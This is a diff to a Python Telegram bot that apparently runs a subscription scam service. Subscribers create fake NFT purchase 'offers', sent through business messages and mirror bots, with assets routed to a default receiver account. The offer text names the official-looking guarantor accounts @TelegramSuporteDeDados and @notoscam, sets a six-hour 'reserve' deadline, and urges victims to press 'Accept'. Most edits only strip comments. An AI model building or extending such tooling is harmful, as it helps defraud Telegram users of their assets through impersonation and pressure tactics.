@@ -26,6 +26,7 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 DB_PATH = os.getenv("DB_PATH", "/data/bot.db")
 
+# Главный бот создаем сразу
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
@@ -42,14 +43,12 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # НЕ удаляем users, чтобы подписки не слетели!
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
             sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
             my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
         )""")
         
-        # Пересоздаем офферы
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("""CREATE TABLE IF NOT EXISTS offers (
             id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
@@ -58,7 +57,6 @@ def init_db():
             created_at INTEGER
         )""")
         
-        # Зеркала
         conn.execute("""CREATE TABLE IF NOT EXISTS mirrors (
             id INTEGER PRIMARY KEY AUTOINCREMENT, 
             token TEXT UNIQUE, 
@@ -103,7 +101,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ (КАРТИНКА СНИЗУ)
+# ОТПРАВКА / УДАЛЕНИЕ
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -174,7 +172,7 @@ async def cmd_start(msg: Message):
             "/set_default @ник — сменить получателя\n"
             "/addkey — создать ключ\n"
             "/setbot [токен] — добавить зеркало\n"
-            "/restartbots — перезапустить все зеркала"
+            "/restartbots — перезапустить всех ботов"
         )
         return
     await show_main_menu(msg, msg.from_user.id)
@@ -185,7 +183,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ЗЕРКАЛА (МЕНЮ)
+# ЗЕРКАЛА
 # ==========================================
 @router.callback_query(F.data == "mirrors_menu")
 async def cb_mirrors_menu(cb: CallbackQuery):
@@ -228,7 +226,7 @@ async def cb_settings(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ПОДПИСКА И ОФФЕР
+# ПОДПИСКА
 # ==========================================
 @router.callback_query(F.data == "create_offer_btn")
 async def cb_create_offer(cb: CallbackQuery):
@@ -343,7 +341,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (КАРТИНКА ВНИЗУ)
+# ОТПРАВКА ОФФЕРА
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -375,7 +373,7 @@ async def handle_business_message(msg: Message):
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
         f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}" # ССЫЛКА В КОНЦЕ
+        f"{nft_link}"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -481,7 +479,7 @@ async def cmd_setbot(msg: Message):
         
         await msg.reply(
             f"✅ Зеркало <b>@{username}</b> сохранено в базу.\n\n"
-            f"⚠️ <b>Важно:</b> Чтобы оно заработало, напиши /restartbots или сделай Redeploy на Railway."
+            f"⚠️ <b>Важно:</b> Чтобы оно заработало, напиши /restartbots."
         )
     except Exception as e:
         await msg.reply(f"❌ Ошибка: {e}")
@@ -490,14 +488,13 @@ async def cmd_setbot(msg: Message):
 async def cmd_restartbots(msg: Message):
     if msg.from_user.id != ADMIN_ID: return
     await msg.reply("🔄 Перезапускаю всех ботов...")
-    # Выходим из процесса, Railway перезапустит контейнер
     os._exit(0) 
 
 # ==========================================
-# ЗАПУСК ВСЕХ БОТОВ (ГЛАВНЫЙ ФИКС)
+# ЗАПУСК ВСЕХ БОТОВ (МУЛЬТИБОТ РЕЖИМ)
 # ==========================================
 async def main():
-    log.info("Starting bots...")
+    log.info("Starting all bots...")
     
     bots_to_start = [bot]
     
@@ -512,7 +509,7 @@ async def main():
         except Exception as e:
             log.error(f"Ошибка загрузки @{m['username']}: {e}")
 
-    # Правильный запуск всех ботов через один Dispatcher
+    # ЗАПУСКАЕМ ВСЕХ БОТОВ ЧЕРЕЗ ОДИН DISPATCHER
     await dp.start_polling(*bots_to_start)
 
 if __name__ == "__main__":
